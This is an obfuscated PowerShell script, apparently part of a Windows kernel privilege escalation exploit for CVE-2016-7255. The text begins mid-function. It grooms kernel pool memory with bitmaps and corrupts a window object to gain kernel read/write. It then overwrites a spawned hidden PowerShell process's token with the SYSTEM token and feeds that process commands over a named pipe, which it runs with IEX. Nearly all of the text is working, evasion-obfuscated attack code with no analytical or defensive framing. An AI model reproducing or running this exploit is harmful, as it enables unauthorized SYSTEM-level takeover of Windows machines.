		${s`YstEmMOdULE`AR`R`Ay} = GeT-loa`D`edmo`DuLES
		${kE`RnE`lB`ASE} = ${SYStem`mO`dul`eaRrAY}[0]."IM`A`Ge`BaSE"
		${keR`N`ELTyPe} = (${sYsT`E`m`MoDULeARRAy}[0]."I`Ma`gENAME" -split "\\")[-1]
		${k`ErNeLH`ANLE} =  (GEt`-vA`RIAb`LE ("R"+"FE51") )."VaL`Ue"::("{0}{2}{1}"-f'Load','ry','Libra').Invoke("$KernelType")
		${Ps`INI`TIaL`SyS`TEMp`RO`cE`SS} =  (gEt-`VaRiAB`Le  ("rF"+"E51") )."VaL`UE"::("{3}{1}{2}{0}" -f 'dress','ocA','d','GetPr').Invoke(${KeRn`e`lHa`Nle}, ("{6}{2}{0}{4}{5}{1}{3}"-f'itia','mProc','n','ess','lSys','te','PsI'))
		${SY`seProCE`S`s`ptR} = if (!${x32`ArChI`TECTU`Re}) {${PsI`N`ItIA`LSYSTEM`pR`OCE`Ss}.("{1}{0}" -f 'oInt64','T').Invoke() - ${kern`el`han`LE} + ${keRNEl`B`Ase}} else {${PS`iN`i`T`iALsySt`E`mpRocess}.("{1}{2}{0}"-f'32','ToI','nt').Invoke() - ${KERnel`HA`NLE} + ${k`ERNelb`A`sE}}
		${CAL`L`RESULT} =   ${Rf`E51}::("{2}{1}{0}" -f'ry','ibra','FreeL').Invoke(${KE`RneL`HA`NlE})
		wR`iTe-VErB`o`sE "[+] _EPROCESS list entry: 0x$("{0:X}" -f $SysEprocessPtr)"
		${sy`se`PRoCe`Ss} = B`ITma`P-Read -Address ${SYSepR`OcesS`Ptr}
		WRItE`-VEr`BosE "[+] SYSTEM _EPROCESS address: 0x$("{0:X}" -f $(Bitmap-Read -Address $SysEprocessPtr))"
		W`RitE-`V`ErbOSe ("[+] PID: $(Bitmap-Read -Address $($SysEPROCESS+$UniqueProcessIdOffset)) ")
		w`RITe-verB`oSe "[+] SYSTEM Token: 0x$("{0:X}" -f $(Bitmap-Read -Address $($SysEPROCESS+$TokenOffset)))"
		${SY`s`Token} = bIT`m`A`P-Read -Address $(${Sy`Se`pROCe`SS}+${ToK`EnOFF`s`eT})
		
		wRi`T`E-VerbOse ("`n[>] "+'S'+'pawn '+'chil'+'d')
		
		${N`Pipen`Ame} = g`e`T-rANdom

		WrITE-`V`ErBOSE ("`n[>] "+'Choose'+'n '+'na'+'me '+': '+"$npipeName")
		
		${S`TAr`Tu`PInfO} = n`Ew-oB`ject ("{1}{0}{2}{3}" -f'RTU','STA','P','INFO')
		${sTARtU`p`INfO}."DW`FlAgs" = 0x00000001
		${START`Up`INfO}."W`sHoW`WinD`Ow" = 0x00000000
		${s`TArt`UpiNFo}."c`B" =   (geT-`iTEm ("{3}{0}{2}{1}"-f 'RIA','5Yv','ble:','vA') )."val`Ue"::("{0}{1}"-f 'Si','zeOf').Invoke(${S`TA`RtUP`InfO}) 
		${proCe`ss`in`Fo} = nEw`-ObJ`Ect ("{2}{0}{3}{1}{4}"-f 'NF','RMATIO','PROCESS_I','O','N')
		${GE`TcuR`RentpaTH} = (Ge`T-I`TEM -Path ".\" -Verbose)."FUlL`NaMe"
		${C`AlL`RESuLt} =   ${1`MS}::("{0}{3}{2}{1}{4}"-f 'Cr','cessWi','tePro','ea','thLogonW').Invoke(
		("{1}{0}" -f'r','use'), ("{0}{1}{2}"-f'doma','i','n'), ("{0}{1}" -f'pa','ss'),
		0x00000002, "$Env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe", (' '+'add-t'+'ype'+' '+'-asse'+'mbl'+'yName '+"`'System.Core`';`$npipeClient "+'= '+'new-'+'obj'+'ec'+'t '+"System.IO.Pipes.NamedPipeClientStream(`'.`', "+"`'$npipeName`', "+"[System.IO.Pipes.PipeDirection]::InOut,[System.IO.Pipes.PipeOptions]::None,[System.Security.Principal.TokenImpersonationLevel]::Impersonation);`$pipeReader "+'= '+"`$pipeWriter "+'= '+"`$null;`$playerName "+'= '+"`'ping`';`$npipeClient.Connect();`$pipeWriter "+'= '+'new'+'-ob'+'j'+'ect '+"System.IO.StreamWriter(`$npipeClient);`$pipeReader "+'= '+'n'+'ew'+'-objec'+'t '+"System.IO.StreamReader(`$npipeClient);`$pipeWriter.AutoFlush "+'= '+"`$true;`$pipeWriter.WriteLine(`$playerName);IEX "+"`$pipeReader.ReadLine();`$npipeClient.Dispose();"),
		${N`ULl}, ${nU`lL}, ${G`ETCur`REnt`PAth},
		[ref]${sTA`RtUP`I`Nfo}, [ref]${PRO`ceS`Si`NfO})


		ad`D-tY`pE -assemblyName ("{1}{0}{2}"-f'or','System.C','e')
		${npiP`E`S`eRver} = n`EW`-ObJE`ct ("{2}{4}{1}{9}{6}{7}{5}{0}{3}{8}{10}"-f'rver','.IO.Pip','S','S','ystem','dPipeSe','s','.Name','tr','e','eam')(${N`pI`Pen`AmE},  ( iT`em ('V'+'aRiAbLE:tA'+'5')  )."v`ALuE"::"i`NouT")
		${npipE`Se`RV`Er}.("{0}{2}{3}{1}"-f 'W','onnection','aitF','orC').Invoke()
		${PIPeR`EA`d`ER} = nEw`-O`BJECT ("{6}{4}{0}{1}{5}{3}{2}" -f'stem.IO.Str','eamR','er','d','y','ea','S')(${npipESer`V`eR})
		${sCRiPt`:`pIPewrit`ER} = nEW`-o`BjecT ("{3}{2}{5}{0}{4}{1}"-f'i','er','StreamW','System.IO.','t','r')(${NPIPE`SE`RV`ER})
		${Pipe`w`RI`Ter}."a`UTo`FLush" = ${T`RuE}
		${p`l`AYernaMe} = ${PIPe`RE`A`DEr}.("{0}{2}{1}" -f 'ReadL','e','in').Invoke()
		
		if(${PlA`yerNa`ME} -eq ("{1}{0}" -f 'g','pin'))
		{
			WRIt`e-veRBO`SE ("{7}{4}{0}{6}{1}{2}{3}{5}"-f'fro','h','ild',', v','g ','oila','m c','[+] Pin')
		}
		
		wR`I`TE-VErBOSe "[+] Child PID is : $("{0}" -f $ProcessInfo.dwProcessId)`n"
		
		W`Ri`TE-`VeRboSe ("`n[>] "+'L'+'eaking'+' '+'cur'+'re'+'nt '+'_'+'EPROCESS'+'..')
		Wr`iT`e`-VE`RBoSE ("{1}{0}{3}{2}{6}{5}{4}" -f '+] Traversing ActiveProcessL','[','n','i','ist','l','ks ')
		${N`Extpro`C`EsS} = $(b`IT`mAp-RE`Ad -Address $(${s`ysEP`R`oceSS}+${acT`Iv`ePRoCE`sS`L`inks})) - ${u`NiQU`eProCES`Sid`OFfSeT} -  ( vArIA`B`LE ("3AlC"+"8o") -vALu  )::"s`iZe"
		while(${T`Rue}) {
			${NE`xTp`Id} = bITM`AP-re`Ad -Address $(${nex`TPR`ocess}+${uNIqu`Ep`R`oCEsSiD`ofF`S`ET})
			if (${NE`Xt`pID} -eq ${PROcEss`in`FO}."D`WpR`OcEssID") {
				wriT`e-`V`e`RBosE "[+] PowerShell _EPROCESS address: 0x$("{0:X}" -f $NextProcess)"
				w`Ri`T`E-VErbo`se ('[+]'+' '+'PID:'+' '+"$NextPID")
				Wr`ITe-ve`R`BOSE "[+] PowerShell Token: 0x$("{0:X}" -f $(Bitmap-Read -Address $($NextProcess+$TokenOffset)))"
				${pO`sHToK`E`NaDdr} = ${n`exTPRo`c`EsS}+${T`O`KenOF`FSet}
				break
			}
			${nex`T`pr`oCESs} = $(biT`mAp-r`EAD -Address $(${Ne`XT`PROcE`Ss}+${a`ctI`VEpR`oCeSs`LinKS})) - ${unIque`PRocE`S`S`IDoffSeT} -   ${3a`lC`8o}::"Si`ZE"
		}

		WrI`T`E-VerbO`SE ("`n[!] "+'D'+'u'+'pl'+'icating '+'SY'+'STEM '+"token!`n")

		Bitma`P`-wRIte -Address ${pO`shTOKe`NaDdR} -Value ${SYS`ToK`EN}

		("`n[!] "+'Suc'+'ce'+'ss, '+'spawnin'+'g'+' '+'a '+'sy'+'s'+'tem '+'shell'+'!')
		
		W`RIt`E-VeRb`OSE ("{9}{6}{8}{3}{2}{5}{0}{7}{4}{1}" -f'e','child','t','nd to ','ed ','he el','!] ','vat','Sending comma','[')
		${P`ipEW`RiTER}.("{2}{3}{1}{0}"-f'ine','iteL','W','r').Invoke(${C`Omma`ND})
		${nPiPeS`e`Rv`eR}.("{0}{1}"-f'Dis','pose').Invoke()	
		
	}

	function s`IM`-kEYdoWn {
		param([Int]${w`Key})
		${kEyb`o`ArDIn`Put} = nEW-`ObJE`Ct ("{0}{3}{2}{1}" -f 'KEY','T','NPU','BDI')
		${KE`YboardiNP`UT}."Dwf`l`AGS" = 0
		${KEYboaRd`iNp`Ut}."w`VK" = ${Wk`eY}

		${InpU`TOBJe`CT} = NeW-o`Bj`eCt ("{0}{1}" -f'INP','UT')
		${InP`U`TObJeCt}."I`TyPe" = 1
		${InPU`T`OB`JEcT}."U" = ${Keyboa`R`DiNPUt}
		${in`p`UtSizE} =  ${5`yV}::("{1}{0}"-f'zeOf','Si').Invoke(${I`NpUt`obje`Ct})
		
		${C`A`l`LreSulT} =   (  GET`-`VA`RiaBle  ('K4'+'98'))."v`ALUE"::("{2}{0}{1}" -f'I','nput','Send').Invoke(1, ${I`NputoBjE`Ct}, ${i`NPuT`S`iZE})
		if (${c`AllRE`SU`lt} -eq 1) {
			${tR`UE}
		} else {
			${FA`lSe}
		}
	}

	function sIm-k`EY`Up {
		param([Int]${Wk`eY})
		${Ke`YB`OaRd`INp`UT} = New`-o`BjECT ("{2}{0}{3}{1}"-f 'BDI','T','KEY','NPU')
		${ke`y`BOARdIn`PUT}."Dwfl`AGS" = 2
		${K`EYB`OaRDiNPut}."W`Vk" = ${wk`ey}
		
		${iNP`UTO`BJ`eCT} = neW-o`BJ`E`CT ("{0}{1}" -f 'INPU','T')
		${i`NpuTobj`eCt}."iT`YPE" = 1
		${i`N`Put`oBjeCt}."U" = ${kEYBOa`R`D`I`NPut}
		${I`Np`UTSi`ZE} =   ${5`yV}::("{0}{1}" -f'Size','Of').Invoke(${InP`U`T`OBJeCt})
		
		${c`AL`LreSulT} =   (gEt-CHIL`DIt`em ("{0}{1}{3}{2}"-f 'vARiaBlE',':k','98','4')  )."Val`Ue"::("{0}{2}{1}"-f'Se','ut','ndInp').Invoke(1, ${InPuTob`JE`CT}, ${inP`UT`Size})
		if (${ca`l`l`REsuLT} -eq 1) {
			${TR`UE}
		} else {
			${fAL`sE}
		}
	}

	function do-`AlTShift`EsC {
		${cAL`L`Res`UlT} = SIm-k`EYd`own -wKey 0x12 
		${ca`ll`ResuLt} = S`Im-KEYd`OwN -wKey 0x10 
		${CaLl`RE`suLt} = s`iM-KEy`DOwN -wKey 0x1b 
		${ca`LL`RE`SulT} = S`Im-`keYUp -wKey 0x1b   
		${c`AL`l`ReSuLT} = s`im-key`Do`WN -wKey 0x1b 
		${CA`llR`e`SuLT} = S`im-KE`yUP -wKey 0x1b   
		${Ca`LLReSU`Lt} = S`IM-KEY`Up -wKey 0x12   
		${c`A`llrESulT} = s`im-K`eyUp -wKey 0x10   
	}

	function dO-`A`L`TSHIfTtab {
		param([Int]${COu`NT})
		${cALl`RES`U`lT} = SiM`-kEydo`wn -wKey 0x12    
		${ca`LLR`esuLt} = Sim-`k`eyDoWN -wKey 0x10    
		for (${I}=0;${i} -lt ${c`O`UNt};${i}++) {
			${ca`Llre`Su`LT} = SIM`-k`ey`dOwn -wKey 0x9 
			${c`All`RESulT} = Sim`-kE`yup -wKey 0x9   
		}
		${caLLr`E`SU`lt} = SIM-K`eyuP -wKey 0x12      
		${CA`LlR`esuLT} = Sim-K`Ey`Up -wKey 0x10      
	}

	do {
		${B`IT`Map1} = ST`AG`E-gSh`ARed`INF`O`BItmaP
		${B`itMa`P2} = StAgE-gsh`ArEdIN`F`o`BIt`Map
		if (${bI`T`Map1}."bItmaP`ke`RNELO`BJ" -lt ${Bit`ma`p2}."biTM`ApKern`ELOBj") {
			${WO`RKeRBiT`MAp} = ${BitMA`P1}
			${m`ANaGERbI`T`map} = ${bIt`MaP2}
		} else {
			${woR`kERB`ITmAp} = ${bitm`A`P2}
			${MA`NagE`RBItmAP} = ${bIt`Ma`p1}
		}
		${DIs`T`AN`Ce} = ${maNa`Ge`Rbi`TMaP}."bITMApkEr`Nel`obj" - ${Wo`R`kERBiTMaP}."B`it`maPkER`NE`loBj"
	} while (${D`Is`TAncE} -ne 0x2000)

	wR`itE-vEr`B`oSe ("{0}{4}{6}{3}{7}{10}{5}{12}{1}{8}{2}{9}{11}"-f '[?]',' ',' ','en',' Adja','ge se','c','t ','pool','feng','lar',' shui..','ssion')
	wr`IT`e-ve`RBOse "[+] Worker  : $('{0:X}' -f $WorkerBitmap.BitmapKernelObj)"
	Wri`T`e`-VerboSE "[+] Manager : $('{0:X}' -f $ManagerBitmap.BitmapKernelObj)"
	W`Ri`Te-VErbOse "[+] Distance: 0x$('{0:X}' -f $Distance)"

	${t`A`RgEtadd`ReSS} = ${w`Ork`ERBitM`AP}."Bi`Tm`ApkERNe`lO`Bj" + 63

	function do-O`RAd`DreSs {
		param([Int64]${A`dD`Ress})

		${AToM`Cre`ATE} = Ne`W`-OBjeCt ("{0}{1}" -f 'ms16','135')
		${ha`T`om} = ${A`To`mcreatE}.("{0}{1}{2}" -f'CustomCla','s','s').Invoke(("{3}{1}{0}{2}"-f '-2016-725','ve','5','c'))
		if (${Ha`T`OM} -eq 0){
			break
		}

		WRiTE`-Verb`O`sE ("`n[?] "+'Cre'+'at'+'ing '+'Windo'+'w'+' '+'o'+'bjec'+'ts')
		${hm`oD} =  ${k4`98}::("{3}{1}{2}{4}{5}{0}"-f'leW','tMo','d','Ge','uleH','and').Invoke( (gET`-V`ARIA`BLe  ("59"+"q") -VAluEo )::"emP`TY")
		${hwNDP`AR`e`Nt} =  ${k4`98}::("{2}{1}{3}{0}" -f'ExW','W','Create','indow').Invoke(0,("{3}{2}{0}{1}{4}"-f '016-72','5','2','cve-','5'), (g`i ("{3}{2}{0}{1}"-f':59','Q','IAblE','VAr'))."V`ALUE"::"eM`Pty",0x10CF0000,0,0,360,360,  (vaR`ia`Ble  ("5"+"cv") -vaLUe)::"Z`Ero", (  G`Ci  ('vArIA'+'ble'+':5C'+'v'))."VAl`Ue"::"zE`Ro",${h`moD},  ${5`cv}::"Z`erO")
		if (${hwN`dpaRE`Nt} -eq 0){
			break
		}

		${Hw`NdCH`i`lD} =  ${k4`98}::("{1}{2}{0}" -f'wExW','Cr','eateWindo').Invoke(0,("{2}{1}{0}" -f'7255','-','cve-2016'),("{1}{2}{0}"-f'55','cve-2016-','72'),0x50CF0000,0,0,160,160,${H`w`NDParE`NT}, ${5`CV}::"ze`RO",${hM`oD},  (  CHild`I`Tem  ("V"+"ARIABlE:5c"+"V"))."Va`LuE"::"ZE`Ro")
		if (${H`W`N`DCHilD} -eq 0){
			break
		}

		${ADdre`Ss} = ${A`dDre`ss} - 0x28

		WrIte-`VE`RbOsE ("{4}{0}{7}{6}{2}{8}{5}{1}{3}{9}" -f'] Co','ow sp','hil','m','[+','nd','pting c','rru','d wi','enu')
		${cA`llrEsU`Lt} =  (  v`ARiaBLe ("K"+"498")  -VALU )::"setwI`NDOWlO`NG`ptr"(${H`W`NDCh`IlD},-12,[IntPtr]${addrE`Ss})

		${calLR`E`SU`lT} =   ( c`hIl`ditem ('v'+'aRi'+'AbLe:K49'+'8') )."VaL`Ue"::("{0}{2}{1}"-f 'ShowWi','dow','n').Invoke(${Hw`N`DPAREnT},1)
		${HDESKTo`pw`InD`ow} =   (  d`Ir  ('vAriabLe'+':k'+'498')  )."va`LuE"::("{4}{3}{2}{0}{1}" -f'W','indow','ktop','es','GetD').Invoke()
		${C`ALlR`E`sULT} =  (g`Ci  ("v"+"aRiABLe:"+"k498") )."vAL`UE"::("{1}{2}{0}" -f 't','SetPar','en').Invoke(${h`W`NdchiLD},${Hd`e`sktoPWInDow})
		${CalLR`E`suLt} =   ${K`498}::("{4}{1}{2}{3}{0}{5}" -f'i','etF','oregroun','dW','S','ndow').Invoke(${HwNDc`hI`LD})

		DO-aL`TS`hi`FtTaB -Count 4

		${C`ALLr`ESulT} =   ${k4`98}::("{3}{2}{0}{1}{4}"-f 'ThisWi','nd','tchTo','Swi','ow').Invoke(${Hwn`dch`iLD},${tr`UE})

		dO-Al`T`ShIfte`SC

		function TrIGgeR-`wRI`TE {
			${sAFeg`U`ARD} =   ( i`TEM ("V"+"AriaBlE"+":n3"+"g")  )."val`Ue"::("{0}{2}{1}"-f'S','ew','tartN').Invoke()
			while (${SAFE`gua`RD}."EL`A`p`sEDM`ILli`sECONdS" -lt 3000) {
				${T`Ag`msG} = NEw`-`OBjecT ("{1}{0}"-f'MSG','tag')
				if ($( (vAr`Ia`Ble  ("K4"+"98")  -Va)::"GeT`mESsa`GE"([ref]${ta`gmSG}, ${5`cv}::"z`ERo",0,0))) {
					${CA`llreSu`lt} =  ${k4`98}::("{1}{2}{0}" -f'us','Se','tFoc').Invoke(${h`WND`PARent}) 
					for (${i}=0;${I}-lt20;${I}++){dO`-al`TS`hI`Ftesc}        
					${c`AlL`R`ESuLt} =  ( C`hiLD`ITEM ("{2}{1}{0}" -f 'k498','E:','VARiaBl') )."Va`LUe"::("{1}{0}"-f'Focus','Set').Invoke(${hWN`DCh`ilD})  
					for (${i}=0;${i}-lt20;${I}++){do-`AlTsh`IftEsC}        
					${C`All`R`EsUlT} =   (  &("{0}{2}{1}"-f'V','abLe','ARi') ("K"+"498") )."val`UE"::"TRansLaTe`m`Es`SaGE"([ref]${ta`GMsG})
					${CA`L`LReSulT} =   (  &("{1}{0}"-f'Ci','g') ("vaRi"+"abLE"+":K"+"4"+"98")  )."vAl`UE"::"Disp`AtChm`ESsA`GE"([ref]${TaGm`sG})
				}
			} ${S`AFEguA`Rd}.("{0}{1}"-f 'St','op').Invoke()
		}
		[IntPtr]${g`LObAL`:`Byte`p`oi`Nter} =   (  &('Ls')  ("{2}{0}{3}{1}"-f'L','k498','VArIaB','E:'))."vAL`Ue"::("{2}{1}{0}{3}" -f 'l','ua','Virt','Alloc').Invoke(  ( &("{3}{2}{0}{1}" -f'B','le','ArIA','GET-v') ("{0}{1}"-f '3','aLc8o') -VaL)::"Ze`Ro", 0x2000, 0x3000, 0x40)
		do {
			&("{2}{1}{3}{0}"-f'bose','e','Writ','-Ver') ((("{8}{3}{4}{11}{5}{7}{10}{6}{2}{0}{1}{9}" -f'ary 1ifO','r1','r',' Trying',' to trigger ','r','t','b','[+]','if..','i','a'))."rEP`LA`cE"(([cHAR]49+[cHAR]105+[cHAR]102),[stRing][cHAR]39))
			${B`yTE`ReAD} =   ${K4`98}::("{3}{2}{1}{0}" -f 'apBits','itm','etB','G').Invoke(${woR`KEr`BiT`M`AP}."biTM`A`PHAN`Dle",0x2000,${b`ytePOiN`TER})
			&("{3}{2}{0}{1}" -f'-Writ','e','igger','Tr')
			${lO`op`CoUnT} += 1
		} while (${b`yteR`Ead} -ne 0x2000 -And ${loOP`Co`UnT} -lt 10)

		${caLL`RE`SULT} =   (&("{1}{2}{0}"-f 'M','ge','T-ITE') ("VAriabl"+"e:k"+"498"))."vAL`UE"::("{2}{1}{0}"-f'oyWindow','estr','D').Invoke(${HwN`DC`H`iLd})
		${c`A`LLre`SuLt} =   ${K`498}::("{0}{2}{3}{1}"-f 'Destro','w','yWind','o').Invoke(${Hwnd`PaRE`Nt})
		${ca`llrE`sULt} =   ( &("{1}{0}" -f'i','Gc')  ("V"+"aRiAble"+":k49"+"8"))."V`ALUe"::("{0}{1}{4}{2}{3}" -f'Unre','gi','e','rClass','st').Invoke(("{2}{1}{0}{3}"-f '25','16-7','cve-20','5'),  ( &("{0}{1}"-f'G','Ci') ("vari"+"A"+"bLE:5CV") )."val`Ue"::"Ze`Ro")
		
		if (${Lo`Opcou`NT} -eq 10) {
			("`n[!] "+'B'+'ug '+'d'+'id '+'not'+' '+'tri'+'gger,'+' '+'tr'+'y '+'aga'+'in '+'or'+' '+"patched?`n")
			${s`cr`iPt:`BugnOTT`RIg`GeRED} = 1
		}
	}

	&("{1}{0}{2}"-f 'Or','Do-','Address') -Address ${T`AR`Ge`TadDress}
	if (${BUG`NOtTr`I`gGeR`ED}) {
		Return
	}

	if (${OsmaJ`OrM`I`N`oR} -eq "6.1") {
		${siZ`e`VAL} = 0x400000770
	} else {
		${SiZE`V`Al} = 0x400000760
	}
	do {
		${rEaD`64} =   ${5`YV}::("{1}{2}{0}" -f 'nt64','R','eadI').Invoke(${BYTE`POIN`Ter}.("{0}{1}"-f 'T','oInt64').Invoke() + ${LO`opCoU`Nt})
		if (${rE`A`d64} -eq ${s`izEv`Al}) {
			${P`O`I`NteR1} =   (&("{0}{1}{2}"-f 'vARI','A','ble') ('5'+'YV') )."V`AluE"::("{2}{0}{1}"-f 'nt6','4','ReadI').Invoke(${by`T`EP`oInteR}.("{0}{1}"-f 'ToInt','64').Invoke() + ${Loo`P`C`OUnt} + 16)
			${PO`In`TeR2} =   ${5`yv}::("{1}{0}{2}" -f 'adI','Re','nt64').Invoke(${b`yTepoi`NTER}.("{2}{0}{1}" -f'oIn','t64','T').Invoke() + ${LO`O`pcounT} + 24)
			if (${pO`i`NTER1} -eq ${P`OI`Nter2}) {
				${bUFfEROFf`s`ET} = ${Lo`oPc`oUNT} + 16
				Break
			}
		}
		${lO`oPc`ounT} += 8
	} while (${lOOp`c`ounT} -lt 0x2000)
	${P`VbI`TS} =  ${5`yV}::("{1}{2}{0}" -f'Int64','R','ead').Invoke(${bYT`e`P`oIntER}.("{0}{1}" -f 'T','oInt64').Invoke() + ${b`U`FfERofFsEt})
	${pv`s`Can0} =  (  &("{2}{1}{0}"-f'E','l','VaRIab') ("{0}{1}" -f'5Y','V')  )."Va`LuE"::("{0}{1}" -f'Read','Int64').Invoke(${BYT`Ep`oIn`TeR}.("{0}{1}"-f 'ToI','nt64').Invoke() + ${bUf`F`eROfFSet} + 8)

	if (${Pv`S`Can0} -ne 0) {
		&("{2}{1}{0}" -f'Verbose','ite-','Wr') ("`n[?] "+'Su'+'cc'+'ess, '+'re'+'ading '+'b'+'eyond '+'w'+'orker'+' '+'bi'+'tmap '+'s'+'ize!')
		&("{3}{0}{1}{2}" -f '-Ver','bo','se','Write') "[+] Old manager bitmap pvScan0: $('{0:X}' -f $pvScan0)"
	} else {
		("`n[!] "+'Buffe'+'r'+' '+'c'+'ont'+'ains '+'i'+'nv'+'alid '+'data'+', '+"quitting..`n")
		Return
	}

	 (  &('lS')  ('Va'+'R'+'IaBL'+'E:5YV'))."val`Ue"::("{1}{0}{2}" -f'eI','Writ','nt64').Invoke($(${B`YtepoIn`TER}.("{1}{0}"-f 'oInt64','T').Invoke() + ${BUF`FE`RoffSEt}),${workE`RB`iTMAp}."b`ITmAPpVsc`An0")
	  ( &("{0}{1}" -f 'iT','eM')  ("{3}{0}{2}{1}"-f 'lE','5Yv',':','variab'))."vA`Lue"::("{2}{1}{0}" -f 't64','In','Write').Invoke($(${by`TE`pOiN`TeR}.("{2}{0}{1}" -f'oI','nt64','T').Invoke() + ${Buf`F`e`ROf`Fset} + 8),${wOr`kERbit`M`Ap}."biT`M`APpvsCAn0")
	${pvs`ca`N0} =   ${5`yV}::("{1}{2}{0}"-f'4','ReadI','nt6').Invoke(${Byt`ePoIN`T`ER}.("{1}{2}{0}"-f '4','ToIn','t6').Invoke() + ${buffE`RofF`set} + 8)
	&("{2}{1}{3}{0}" -f 'rbose','-V','Write','e') "[+] New manager bitmap pvScan0: $('{0:X}' -f $pvScan0)"

	${cA`l`lR`esult} =  (&("{0}{1}{2}" -f'Va','Ri','abLe') ("{0}{1}" -f 'K','498')  )."VA`lue"::("{3}{4}{1}{2}{0}"-f's','ap','Bit','Se','tBitm').Invoke(${wO`Rk`E`RBitM`AP}."B`ItmapHaN`D`Le",0x2000,${b`YT`EpoIN`Ter})

	&("{0}{3}{2}{1}"-f'B','ate','ap-Elev','itm') -ManagerBitmap ${MAna`GErbI`TM`AP}."Bi`TMa`phanD`lE" -WorkerBitmap ${WOr`K`e`Rb`iTmAp}."BitMAp`hA`N`dlE"
}